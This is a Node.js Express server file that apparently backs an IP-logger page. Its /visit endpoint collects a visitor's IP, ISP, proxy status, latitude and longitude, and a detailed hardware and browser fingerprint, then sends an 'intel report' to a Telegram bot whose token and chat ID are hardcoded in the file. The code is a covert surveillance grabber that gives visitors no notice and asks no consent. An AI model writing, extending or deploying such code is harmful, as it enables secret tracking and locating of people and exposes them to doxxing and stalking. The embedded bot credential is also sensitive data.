const express = require("express");
const path = require("path");

const app = express();
app.use(express.json());

// ====== TELEGRAM CONFIG ======
const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";
const PORT = process.env.PORT || 3000;

// ====== TELEGRAM NOTIFIER ======
async function notifyTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "HTML" }),
    });
  } catch (err) { console.error("Telegram Error:", err); }
}

// ====== LOGGING LOGIC ======
app.post("/visit", async (req, res) => {
  try {
    const client = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // Fetch Full ISP Data (All possible fields: 16777215)
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=16777215`);
    const geo = await geoRes.json();

    const report = `
<b>🚨 FULL VISITOR INTEL REPORT (100% CAPTURE)</b>
-----------------------------------------
<b>🌐 IP & ISP DATA</b>
<b>• IP Address:</b> <code>${ip}</code>
<b>• ISP:</b> ${geo.isp}
<b>• Organization:</b> ${geo.org || "N/A"}
<b>• AS/Network:</b> ${geo.as}
<b>• Mobile Network:</b> ${geo.mobile ? "Yes 📱" : "No 🏠"}
<b>• Proxy/VPN:</b> ${geo.proxy ? "Detected ⚠️" : "No ✅"}
<b>• Hosting/DC:</b> ${geo.hosting ? "Yes (Server)" : "No (User)"}

<b>📍 GEOGRAPHICAL INFO</b>
<b>• Country:</b> ${geo.country} (${geo.countryCode})
<b>• Region/City:</b> ${geo.regionName} / ${geo.city}
<b>• ZIP Code:</b> ${geo.zip}
<b>• Lat/Lon:</b> ${geo.lat}, ${geo.lon}
<b>• Timezone:</b> ${geo.timezone} (Client: ${client.env?.tz})

<b>💻 HARDWARE FINGERPRINT</b>
<b>• GPU:</b> <code>${client.gpu}</code>
<b>• CPU Cores:</b> ${client.hardware?.cores}
<b>• RAM:</b> ~${client.hardware?.ram} GB
<b>• Platform:</b> ${client.hardware?.platform}
<b>• Architecture:</b> ${client.hardware?.architecture}
<b>• Resolution:</b> ${client.display?.res} (${client.display?.ratio}x density)
<b>• Touchscreen:</b> ${client.hardware?.touchPoints > 0 ? "Yes" : "No"}

<b>🔋 LIVE DEVICE STATUS</b>
<b>• Battery:</b> ${client.battery?.level || "N/A"} (${client.battery?.status || "N/A"})
<b>• Net Type:</b> ${client.net?.type} (Speed: ${client.net?.speed})
<b>• Network Ping:</b> ${client.net?.ping}

<b>🧠 BROWSER IDENTIFIER</b>
<b>• Languages:</b> ${client.env?.lang}
<b>• Referrer:</b> ${client.env?.ref}
<b>• Bot/Automation:</b> ${client.env?.webdriver ? "True 🤖" : "False"}
<b>• User-Agent:</b> <code>${req.headers["user-agent"]}</code>

<b>⏰ LOGGED AT:</b> ${new Date().toUTCString()}
-----------------------------------------
`;

    await notifyTelegram(report);
    res.json({ status: "success" });
  } catch (e) {
    res.status(500).json({ error: "logging_failed" });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`[STATUS] Intel Server listening on port ${PORT}`);
});
